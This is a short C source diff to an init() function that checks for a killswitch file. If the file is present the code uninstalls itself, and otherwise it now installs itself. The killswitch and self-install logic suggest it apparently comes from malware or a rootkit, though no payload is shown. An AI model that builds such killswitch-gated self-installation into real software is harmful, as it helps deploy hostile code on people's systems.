@@ -9,12 +9,16 @@ init(void)
     #endif
     #ifdef KILLSWITCH
     struct stat buffer;
-    if (stat (KILLSWITCH, &buffer) == 0){
+    if (stat(KILLSWITCH, &buffer) == 0){
         #ifdef DEBUG
         printf("[!] killswitch found!\n");
         #endif
         uninstall();
+    } else{
+        install();
     }
+    #else
+    install();
     #endif
 }
 
